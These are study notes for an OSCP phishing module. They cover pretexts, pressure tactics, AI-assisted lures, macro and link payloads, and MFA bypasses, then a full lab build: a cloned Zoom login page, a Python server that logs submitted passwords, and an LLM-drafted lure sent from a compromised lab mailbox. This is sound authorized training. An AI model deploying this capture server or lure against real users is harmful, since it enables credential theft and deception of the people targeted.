# Module 11: Phishing Basics

## Tags
#OSCP #Module11 #Phishing #SocialEngineering #Smishing #Vishing #CredentialPhishing #MFABypass

---

## **Why This Module Matters**
Phishing sits at the intersection of tech skill and social manipulation. The actual exploitation part (cloning a site, standing up a listener) is often the easy bit, the hard part is getting someone to trust you enough to click. This module walks through how a real phishing campaign gets built end to end: picking a pretext, choosing a payload, dodging the defenses in the way, and finally cloning a real login page to harvest creds.

This module covers the theory of phishing (email, SMS, voice, AI-assisted), the technical roadblocks you'll hit (email filters, MotW, password managers, MFA) and their bypasses, and a full hands-on credential-phishing build against a cloned Zoom login page.

**✅ Status:** Module complete. 11.1, 11.2, 11.3 (full credential phishing build, VM #1), and 11.4 all done.

---

## 11.1. Phishing 101

### 11.1.1. Email Phishing

Every phish starts with a goal: get the target to run code, or get the target to hand over credentials. That goal shapes everything downstream, including which payload you pick.

**The two payload-delivery approaches for code execution:**
- **Malicious attachment**: Office doc, PDF, zip/7z archive, shortcut (`.lnk`) file, or even a calendar invite. Target opens it, payload runs.
- **Malicious link**: sends the target to a site that exploits a browser vulnerability to get code execution, no attachment needed.

**The credential-theft approach:** send a link to a page that looks like a login page the target already trusts (their email provider, a work tool, whatever). If they type real credentials into it, you now have those credentials.

**The pretext is everything.** A pretext is just the cover story, whatever convinces someone the email/link/attachment is legitimate. Typos, bad grammar, weird formatting: any of these can blow the whole thing. A good pretext needs:
- To look like it's coming from somewhere the target would expect (a colleague, a vendor, a familiar brand)
- Metadata (sending domain, etc.) that holds up to a quick glance
- Content that matches what that department/role actually receives day to day

**Making the "from" address convincing** is its own problem. A few ways attackers solve it:
- **Lookalike domains**: buy a domain that looks like the target's org, or one of their vendors/clients (think `corp-support.com` instead of `corp.com`)
- **Compromised legitimate accounts**: if you can get into a real mailbox at the target org (leaked creds, a breach dump, whatever), sending from that account is about as convincing as it gets, since it *is* legitimate, just controlled by someone else now

**Whaling** is spear phishing aimed specifically at high-profile individuals (execs, board members). It needs more research and a tighter pretext than a typical campaign, since these targets tend to be more cautious (and better protected).

> 💼 On a real engagement, you'll often get a "do not target" list from the client, usually the exact high-profile people whaling would target.

**Clone phishing** is the generic, broad-reach version: impersonate a commonly-used service (Slack, Zoom, Gmail, Teams) with an email that links to a cloned login page for that service. Doesn't need to be personalized, works at scale.

📸 Screenshot: (placeholder — any phishing email examples/screenshots as we build them out in 11.3)

#### Tags: #EmailPhishing #Pretexting #Whaling #ClonePhishing #LookalikeDomains

---

### 11.1.2. Smishing, Vishing, and Chatting

**Smishing** = SMS + phishing. Same idea as email phishing, different medium, different considerations:
- SMS feels more personal/direct than email, so the pretext needs to match that. A work-phone smish should sound work-related, a personal-phone smish should reference things a friend/family member would know
- The target won't have your number saved, so the pretext has to explain that away too (e.g. "this is my new number")
- **CEO gift card scam**: classic smishing pretext, attacker poses as a senior exec asking an employee to buy/send gift cards. Works because "the CEO is asking me directly" short-circuits normal skepticism

**Vishing** (voice phishing) is a phone call where the attacker talks to the target directly. Much more about social engineering skill than technical skill, there's no payload to build, just a convincing conversation.

**Caller ID spoofing** lets an attacker fake the source number on a smish or vish, easier than ever now thanks to VoIP.

**SIM swapping** is a related but distinct attack: the attacker calls the target's mobile carrier, convinces them they're the account owner, and gets the phone number ported to a SIM the attacker controls. This hijacks the number until the real owner recovers it. Beyond just enabling spoofing, this is a serious way to bypass SMS-based MFA, since the attacker now receives the target's MFA codes directly.

Chat platforms (Discord, Slack, Teams) are increasingly phishing targets too, same underlying tactics, different app.

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| What type of phishing attack is performed when the target is a high profile individual? | **Whaling** |
| What is the term for phishing over SMS? | **Smishing** |
| What is the name of the technique in which the attacker reaches out to a mobile network provider and claims to be the owner of a specific mobile phone account? | **SIM swapping** |

#### Tags: #Smishing #Vishing #SIMSwapping #CallerIDSpoofing #Lab #Quiz #Module11

---

### 11.1.3. Enhancing Phishing through Social Engineering

Social engineering is psychological manipulation, not a technical skill, and it gets sharper with practice/trial-and-error. The whole point is getting the target to trust the phish enough to act on it.

**Trust has to be consistent end to end.** If your pretext says "I'm from Zoom," your landing page needs to actually look like Zoom, your sending domain needs to hold up, and small details matter: HTTPS on the fake login page (a plain HTTP login form looks instantly wrong these days), writing style that matches whoever you're impersonating, maybe even some rapport-building before you ever send the malicious link/attachment.

**Beyond trust, four common pressure tactics:**
- **Urgency**: push the target to act fast, before they think it through. Works best in workplaces where people are already used to urgent asks with no room to question them
- **Fear**: makes people freeze up their critical judgment momentarily
- **Authority**: impersonating a boss/exec, compounds well with urgency ("the CEO needs this now")
- **Baiting**: dangle something positive instead (gift card, cash, a favor with a superior) to get compliance. Blends in easily since legitimate companies do this too (surveys with incentives, etc.)

None of this works in isolation, a real campaign usually blends a couple of these with a solid pretext.

#### Tags: #SocialEngineering #Pretexting #Urgency #Authority #Baiting

---

### 11.1.4. LLMs, Generative AI and Deepfakes

LLMs and Gen AI have become genuinely useful tools on both the research and content-generation side of phishing.

**Research/pretext generation:** an LLM can process large amounts of public info about a target (this is basically Retrieval Augmented Generation, RAG, applied to OSINT) and turn it into pretext material. For high-profile targets, the model might already "know" enough without needing RAG at all, since public info about them is already in its training data.

Real-world tracking of this: Microsoft flagged a 2023 uptick in LLM-crafted phishing emails, and Mandiant's 2024 M-Trends report noted rising Gen AI use in social engineering. Worth noting these groups can only see what actually got sent, not how much AI assistance happened earlier in the research/planning phase, so the real number is probably higher than what gets reported.

**Voice cloning** now needs only a small amount of recorded audio to build a usable voice model, and quality keeps improving (harder to detect).

**Deepfake video** is the same idea applied to a live face. The headline example: in 2024, architecture firm Arup lost $25 million after deepfaked video clones of their CFO and other staff appeared on a video call and approved the transfer. Not a hypothetical, this actually happened.

As a pentester, these are tools worth knowing how to use (within the scope of an authorized engagement) to complement the more traditional phishing techniques covered above.

#### Tags: #LLM #GenerativeAI #Deepfakes #VoiceCloning #RAG

---

## 11.2. Payloads, Misdirection, and Speedbumps

With a pretext ready, the next question is payload: what are we actually trying to get the target to run or hand over, and what's standing in the way.

### 11.2.1. Understanding the Role of Inbound Email Filters

Before picking a payload, know what you're up against. Most organizations run inbound email filters that check incoming mail for red flags and block anything suspicious.

**What filters check:**
- **Sender domain reputation**: reputation block lists, plus signals like how old the sending domain is (a domain registered yesterday is a red flag)
- **Attachments**: `.exe`/`.scr` get flagged hard, but plenty of filters also scrutinize Office docs, PDFs, archives (zip), and script files, or links pointing to any of those file types hosted externally
- **External-sender markers**: even mail that gets through often gets a visible `[EXTERNAL]` tag prepended to the subject, a last-resort visual warning even if the email is otherwise dressed up to look internal

None of this makes phishing impossible, it just means the payload and delivery method both need to account for these speedbumps.

#### Tags: #EmailFilters #DomainReputation #ExternalTagging

---

### 11.2.2. Identifying Risks of Malicious Office Macros

Office has been a phishing favorite for decades because of VBA (Visual Basic for Applications), the scripting language built into Word/Excel/etc. that lets documents run custom macros. Legit use case: automation in complex enterprise documents. Attacker use case: code execution the moment someone opens the file and enables macros.

This isn't new. The Melissa Macro Virus (a malicious Word doc) got a US-CERT warning all the way back in 1999. Attackers have leaned on Office macros ever since.

**Microsoft's countermeasures, in order:**
1. Macros disabled by default, user has to explicitly turn them on
2. **Mark of the Web (MotW)**: an NTFS file attribute Windows sets automatically on anything downloaded from an external source (the internet, an email attachment, etc.)
3. **Protected View**: Office checks for MotW and opens the file in a read-only sandbox with a warning banner, user has to actively click through to edit/enable content
4. Most recently: Office now blocks macros outright on any file carrying MotW, by default. Since basically everything delivered by email carries MotW, this closes off a lot of the old macro-phishing playbook



> **⚠️ MotW isn't bulletproof.** CVE-2022-41091 was a real bypass, though patches for known bypasses tend to land fast.

Admins can also lock these protections down at the AD Group Policy level (no exiting Protected View, macros disabled entirely org-wide), which individual users can't override.

**Why macros aren't dead yet:** plenty of orgs run outdated Office versions that predate these protections, or only apply partial Group Policy hardening. Don't write this vector off just because Microsoft's tightened the defaults.

#### Tags: #OfficeMacros #VBA #MarkOfTheWeb #ProtectedView #GroupPolicy

---

### 11.2.3. Assess Threats from Malicious Files

`.exe` files are technically the most straightforward payload, but statistically they rarely even make it to an inbox, and most users already know not to run a random EXE from email. So attackers have shifted to other file types: `.scr`, `.hta`, JScript files, and non-mainstream Office-adjacent formats.

**Real CVEs worth knowing:**
- **CVE-2017-11882**: memory corruption in the old Equation Editor (bundled with Office until 2018). Still saw active exploitation as late as 2023 against orgs running unpatched Office.
- **CVE-2023-21716**: RTF parser vulnerability in Word, public PoCs exist.
- **CVE-2023-21608**: use-after-free in Adobe Acrobat Reader, public PoCs give code execution.

**Targeted research angle:** for a specific target, you can research what software they actually run (job postings, LinkedIn, company site, review sites like G2/Capterra, industry forums, tech news) and go looking for a vulnerability that hits that exact stack. The most advanced version of this is hunting/buying a 0-day for software you know the target uses, expensive and slow, but Office's macro crackdown has actually made this kind of approach more attractive by comparison.

**Patch-diffing** (reverse-engineering a security patch to find the vulnerability it fixes, then weaponizing it before most orgs have actually applied the patch) gives attackers a short but real window to exploit N-days at scale before the herd catches up.

#### Tags: #MaliciousFiles #CVE #PatchDiffing #TargetedResearch #ZeroDay

---

### 11.2.4. Recognize Malicious Links

Links sidestep file-based filtering entirely: no attachment to scan, just a URL. Two broad goals: harvest credentials via a cloned login page, or trigger a browser exploit for code execution.

**Password managers are a real speedbump for credential cloning.** They only autofill on the actual matching domain, so `m1cros0ft.com` won't get autofilled with real Microsoft creds. That said, password manager extensions have had real vulnerabilities:
- 2016: a crafted URI could trick the LastPass extension into revealing stored passwords
- 2017: Google Project Zero found a LastPass bug allowing arbitrary vault reads (and possibly code exec)
- 2021: a Safari 1Password extension bug let attackers read vault items like credit card info
- 2023: the "AutoSpill" attack abused how Android exposes WebViews to a parent app, letting a malicious app steal credentials

These are real but situational, you can't rely on one being available on a given engagement. Most of the time, password managers remain a genuine obstacle to credential phishing.

**Making the link itself look legitimate:**
- **URL shorteners** (TinyURL, Bitly) hide the real destination, but the shortening service can and will kill the link if they detect it's malicious
- **Homograph URLs**: swap ASCII characters for visually-identical Cyrillic/Greek/Latin lookalikes. `apple.com` vs `аррӏе.com`, that "l" is actually a Cyrillic "І". Renders near-identically in a lot of browsers, points somewhere totally different
- **Valid HTTPS is basically mandatory** now, an HTTP warning banner on a fake login page kills the pretext instantly

**Beyond credential theft, links can also carry:**
- A **browser 0-day/N-day** exploit for direct code execution (advanced, needs a genuinely reliable exploit and the target using the exact vulnerable browser)
- A **CSRF exploit**: abuses an existing logged-in session in the target's browser to make it perform an action without the user intending to. CVE-2024-1879 (AutoGPT) is a real example that got all the way to arbitrary code execution via CSRF
- An **NTLM hash leak**: even with NTLM being phased out, older systems can still be tricked into an NTLM handshake via a malicious link (or even just an embedded image pointing at an SMB share), leaking a capturable NetNTLMv2 hash. Dated technique, but still seen in the wild as recently as February 2024

#### Tags: #MaliciousLinks #HomographURL #CSRF #NTLMRelay #PasswordManagerBypass #CVE

---

### 11.2.5. Differentiate Credential Phishing and Multi-Factor Authentication (MFA)

Getting credentials doesn't always mean getting in, MFA is the next roadblock. A few ways around it:

- **Prompt bombing** (a.k.a. MFA fatigue): spam push-based MFA approval requests until the target just taps "approve" to make the notifications stop, assuming it's a glitch rather than an active attack. Lapsus$ used this successfully in real incidents.
- **MFA-aware credential phishing page**: build the MFA prompt directly into your cloned login flow, so you capture the token along with the password. The catch: MFA tokens are short-lived, so you have to relay it to the real service almost immediately. Single-use, but effective if timed well.
- **Browser-in-the-middle**: proxy the target's real session live, so the victim is genuinely talking to the real site (and the real site's session cookie/MFA token end up under your control too). Tools like cuddlephish automate this, but it needs a public IP and isn't something you can just spin up on a local network.
- **Brute-forcing the MFA code**: a 6-digit TOTP code is theoretically brute-forceable, in practice this needs the MFA server to allow effectively unlimited attempts over a long window, which most don't.
- **Social engineering the code directly**: call the target pretending to be helpdesk/IT and just ask for the code. Needs a strong pretext to land.
- **SIM swapping** (again) if the MFA delivery method is SMS. Not something you'd do on a legitimate pentest (real legal exposure), but worth understanding as a real-world tactic against SMS-based MFA.

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| What scripting language is natively supported in Microsoft Office? | **VBA** (Visual Basic for Applications) |
| What is the name of the phenomenon in which a user will respond to a flood of MFA requests? | **MFA fatigue** (a.k.a. prompt bombing, from the attacker's side) |

#### Tags: #MFABypass #PromptBombing #MFAFatigue #BrowserInTheMiddle #Lab #Quiz #Module11

---

## 11.3. Hands-On Credential Phishing

> 🔧 Technique: clone a real login page (Zoom), fix the broken interactive bits (cookie banner, login flow) with a Python/BeautifulSoup script, stand up a credential-capture listener, then deliver it via a phishing email sent from a compromised internal mailbox.

This section is a full hands-on build, not just reading. Same as every other hands-on module section: I'll walk you through it step by step once the lab VM is up, you run the actual commands and paste back what happens, rather than me just transcribing the module's own example output as if it were yours.

### 11.3.1. Creating a Zoom Credential Phishing Pretext
> 🔧 Technique: recon a compromised mailbox's Sent folder for a real internal email to imitate, then use an LLM to draft a matching-tone phishing reply.

Target: `192.168.170.77`. Webmail portal at `http://192.168.170.77/mail/`, logged in as `helpdesk@mail.corp.com` / `Helpdesk@Password2024`.


**Step 1: Check the Sent folder for a usable pretext**
Found `Zoom License Inventory Refresh`, sent 2025-01-09, to the sales department:
```
Hello Sales department,

Hope you're knocking it out of the park this week! We're trying to redo our inventory of Zoom licenses as we seem to have a large number which aren't being used at the moment. Rather than having everyone reply to the e-mail, in order to keep your Zoom license, please just ensure that you login to your account and schedule a meeting within the next two weeks. Any accounts which don't do this within the time frame will be transitioned to a free license.

Thank you very much for your cooperation and apologies for the hassle!
```


**Recipients (5):** `j.smith.sales@mail.corp.com`, `a.jones.sales@mail.corp.com`, `m.brown.sales@mail.corp.com`, `d.wilson.sales@mail.corp.com`, `l.martin.sales@mail.corp.com`

**Step 2: Draft a matching-tone reply with an LLM**
```
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder, hope everything's going smoothly on your end! We're still working through our Zoom license inventory and noticed a few accounts haven't logged in to schedule a meeting yet. To keep your account on a full license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, inactive accounts will be moved to a free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you have any questions.

Best regards,
CORP.COM Helpdesk Team
```
Keeps the same casual, apologetic, slightly rambly voice as the original (contractions, the "hassle" apology), that consistency is what actually sells a pretext. "click here" is the eventual home for the malicious link once the cloned site is ready in 11.3.2-11.3.4.

**Lab answer:** 5 recipients.

### 11.3.2. Cloning a Legitimate Website
> 🔧 Technique: first attempt with `wget`, hits a broken CSRF-guard/JS issue, second attempt with SingleFile CLI (a headless-Chromium-based full-page capture tool) actually works.

**Step 1: First attempt with `wget`**
```bash
mkdir ~/ZoomSignin && cd ~/ZoomSignin
wget -E -k -K -p -e robots=off -nd "https://zoom.us/signin#/login"
```
Downloaded 4 files (`signin.html`, `csrf_js`, `zm_bundle.js?cache`, `zm_bundle.js?async`), matching the module's own result exactly.

**Step 2: Serve it and check the render**
```bash
sudo python3 -m http.server 80
```
`http://127.0.0.1/signin.html#/login` threw an **OWASP CSRFGuard error**: "JavaScript was included from within an unauthorized domain." Expected, since `wget` only grabs raw HTML/JS, it doesn't execute anything, and the page's own CSRF protection blocks loading its JS from a domain (`127.0.0.1`) it doesn't recognize.


> 🔍 Full breakdown of why `wget` can't clone a JS-driven login page: [[Phishing (Breakdowns)#Why wget alone can't clone a modern login page|Command Breakdowns]]

**Step 3: Switch to SingleFile CLI**
```bash
rm -rf ~/ZoomSignin/*
sudo apt install nodejs npm chromium -y
sudo npm install -g single-file-cli
cd ~/ZoomSignin
single-file "https://zoom.us/signin" signin.html --browser-executable-path /usr/bin/chromium
```
Unlike `wget`, SingleFile actually launches headless Chromium, renders the page for real (JS included), and saves the fully-rendered DOM as one self-contained HTML file (~1.9MB, everything inlined: CSS, JS, images as base64, which is why it's so much bigger than the raw `wget` output).

**Step 4: Reload and check the interactive elements**
```bash
sudo python3 -m http.server 80
```
`http://127.0.0.1/signin.html` now renders the real Zoom sign-in page, cookie consent modal included (Accept/Decline/Cookie Settings buttons all present). But:
- Clicking **Cookie Settings** does nothing (relies on Zoom's OneTrust JS, which doesn't function against a local clone)
- Typing an email and clicking **Next** does nothing either (the Vue.js app logic that drives the actual login flow wasn't preserved, only the rendered HTML/CSS was)

This confirms exactly what 11.3.3 needs to fix: a working cookie banner, and a working (fake) login flow.


### 11.3.3. Cleaning Up the Clone
> 🔧 Technique: Python/BeautifulSoup script to strip the broken cookie banner and wire up a working two-step (email → password) login flow, matching Zoom's real UX.

**Step 1: Confirm the exact target attributes before writing anything**

The module's own script assumes quoted HTML attributes (`id="signin_btn_next"`), but SingleFile's actual output here used **unquoted** attributes (`id=signin_btn_next`), and the `email` field's attribute order also differed from what the module expected. A raw string-replace built against the module's assumptions would have silently done nothing, no error, just a script that "succeeds" while never actually wiring anything up.
```bash
grep -o 'id="signin_btn_next"' ~/ZoomSignin/signin.html   # no match
grep -o 'id=signin_btn_next' ~/ZoomSignin/signin.html     # matches
```
**Fix:** used BeautifulSoup's proper attribute API (`soup.find(id="...")` + setting `elem['onclick'] = ...`) instead of raw string-replace for the button/field modifications. BeautifulSoup normalizes quoting/attribute-order when it parses, so this is immune to the exact issue above, only the OneTrust-element-removal step needs id matching at all, and `.find(id=...)` handles that natively too.
> 🔍 Full breakdown of why raw string-replace is fragile here and `.find()` isn't: [[Phishing (Breakdowns)#BeautifulSoup's attribute API vs. raw string-replace for patching a clone|Command Breakdowns]]

**Step 2: Run the modification script**
Script (full version in [[COMMAND BREAKDOWNS]], see below): parses `signin.html` with BeautifulSoup, removes the OneTrust cookie-consent wrapper (`onetrust-consent-sdk` was present and removed, the other 4 candidate IDs weren't present in this capture, expected, SingleFile likely consolidated them), adds an `onclick="goToPassword()"` handler to the Next button, adds Enter-key support to the email field, then appends: a hidden password-entry overlay styled to match Zoom's real second login step, the `goToPassword()` JS function that reveals it, and a working replacement cookie banner.

> **🛠️ Troubleshooting hit:** first paste of the script threw `SyntaxError: unterminated string literal`, a long single-quoted JS string got line-wrapped mid-paste by the terminal. Nothing executed (Python compiles the whole script before running any of it, so `signin.html` was untouched), fixed by breaking that one long string into shorter concatenated pieces so it's less likely to wrap during paste.

**Step 3: Confirm the flow works**
Reloaded `http://127.0.0.1/signin.html`:
- Custom cookie banner shows, **Cookies Settings** dismisses it
- Entered a test email, clicked **Next** → password overlay appeared with "Welcome, `<email>` Change", **Stay signed in** checkbox, **Forgot password** link, all matching the real Zoom UX


### 11.3.4. Capturing Credentials
> 🔧 Technique: minimal Python HTTP server on port 8080 (matching the password overlay form's `action`), logs whatever gets POSTed, then redirects the victim to the real Zoom login so it just looks like their login failed.

```bash
cat > ~/ZoomSignin/cred_server.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        print(f'\n[+] Raw data: {raw}')
        data = parse_qs(raw)
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        print(f'[+] Captured credentials!')
        print(f'    Email:    {email}')
        print(f'    Password: {password}\n')
        self.send_response(302)
        self.send_header('Location', 'https://zoom.us/signin')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
PYEOF
python3 ~/ZoomSignin/cred_server.py
```

**Test result:** entered a fake email/password into the cloned page, clicked Sign in, got redirected to the real Zoom login (302 doing its job), and the listener caught it clean:
```
[+] Captured credentials!
    Email:    cookie@fart.com
    Password: fake password

127.0.0.1 - - [04/Aug/2026 16:45:23] "POST /creds HTTP/1.1" 302 -
```
Full pipeline confirmed working: clone → patched login flow → credential capture → redirect-to-real-site cover story.


### 11.3.5. Crafting the Phishing Email
> 🔧 Technique: send the drafted reply from the compromised helpdesk account, with a hyperlink pointing at the cloned Zoom page, then confirm the full chain by acting as the victim.

**Step 1: Fix the cross-machine gap before sending anything**

Testing so far had been entirely on `127.0.0.1`, but the actual victim (`j.smith.sales`) opens this page from a different machine on the lab network. The form action still pointed at `127.0.0.1:8080`, which would resolve to the *victim's own machine*, not the attacker's, once opened from anywhere else. Confirmed scope before touching it, then patched:
```bash
grep -n "127.0.0.1:8080" ~/ZoomSignin/signin.html   # confirmed only 1 hit, the form action
sed -i 's|127.0.0.1:8080|192.168.45.212:8080|' ~/ZoomSignin/signin.html
```
Same underlying lesson as the `python3 -m http.server` "wrong directory" gotcha and the `curl --data` vs `--data-urlencode` issue from earlier modules: **things that work fine on `127.0.0.1` during local testing can silently break once a different machine is actually involved.** Always double check for localhost-only assumptions before delivering a payload cross-machine.
> 🔍 Full breakdown: [[Phishing (Breakdowns)#Why 127.0.0.1 breaks once a real victim machine is involved|Command Breakdowns]]

**Step 2: Send the phishing reply**

Logged into `http://192.168.170.77/mail/` as `helpdesk@mail.corp.com`, opened the Zoom license email in Sent, **Reply to sender and all recipients**, pasted the drafted text from 11.3.1, switched to HTML mode, and turned "click here" into a hyperlink pointing at `http://192.168.45.212/signin.html`. Sent.


**Step 3: Act as the victim**

Logged into the same webmail as `j.smith.sales@mail.corp.com` / `W00tw00t!!`, found the phishing email, clicked the link, entered `j.smith.sales@mail.corp.com` and a fake password on the cloned page, clicked Sign in.


**Result, caught on the credential server:**
```
[+] Raw data: email=+j.smith.sales%40mail.corp.com&password=fake+password
[+] Captured credentials!
    Email:     j.smith.sales@mail.corp.com
    Password: fake password

192.168.45.212 - - [04/Aug/2026 16:58:04] "POST /creds HTTP/1.1" 302 -
```
Confirmed the source IP was the actual lab network this time (not `127.0.0.1`), the fix held. Full chain works: compromised mailbox → researched pretext → LLM-drafted reply → cloned + patched login page → credential capture → redirect-to-real-site cover story.


**Lab answer:** the redirect line in `cred_server.py`: `self.send_header('Location', 'https://zoom.us/signin')`

#### Tags: #Lab #Quiz #Module11 #Capstone #CredentialPhishing #WebsiteCloning

---

## 🎯 Related Tools to Practice

This module doesn't map cleanly onto "Related Boxes to Practice" the way exploitation modules do, HTB/Vulnhub-style static machines don't really do live social engineering, phishing is inherently about the human element, not a vulnerable service waiting to be found. Rather than force an unrelated box in, worth naming the tools that formalize what we just built by hand:

- **[GoPhish](https://getgophish.com/)**: open-source phishing framework, campaign management, landing page hosting, and results tracking, basically productionizes the manual clone-and-capture workflow from 11.3.
- **[Evilginx2](https://github.com/kgretzky/evilginx2)**: the real tool behind the "browser-in-the-middle" MFA-bypass technique mentioned in 11.2.5, proxies a live session instead of just cloning a static login page, captures session tokens/MFA alongside credentials.
- **King Phisher**: another open-source phishing campaign toolkit, similar space to GoPhish.

> ⚡ **On [[MODERN TOOLING]]:** these three aren't duplicated there. They're full-campaign automation platforms, the same category [[MODERN TOOLING]] deliberately excludes (same spirit as sqlmap/Metasploit, just for phishing instead of exploitation), so this section stays the canonical place for them rather than being split across two docs.

#### Tags: #RelatedTools #GoPhish #Evilginx2

---

## 11.4. Wrapping Up

Phishing is as much art as it is technical exercise. It leans on understanding human behavior, careful research, and precise execution, and attackers now have Gen AI, voice cloning, and deepfakes stacked on top of the classic playbook (lookalike domains, compromised mailboxes, macro payloads, credential-cloning pages, MFA bypasses).

The throughline for the whole module: every technical trick (HTTPS on the fake page, a working cookie banner, a matched writing style) exists to serve the same goal, making the target trust the phish enough to stop thinking critically about it. The technical build in 11.3 is really just the last mile of a much longer trust-building exercise that starts with research and pretext.

#### Tags: #PhishingSummary #Module11Recap

---

## **Outstanding Sections**
- [x] **11.1 Phishing 101**: done (email/smishing/vishing/social engineering/Gen AI theory)
- [x] **11.2 Payloads, Misdirection, and Speedbumps**: done (email filters, macros, malicious files, malicious links, MFA bypass theory)
- [x] **11.3 Hands-On Credential Phishing**: done, full chain confirmed on VM #1 (wget clone → SingleFile clone → BeautifulSoup patch → credential server → sent from compromised helpdesk mailbox → captured j.smith.sales's credentials cross-machine)
- [x] **11.4 Wrapping Up**: done
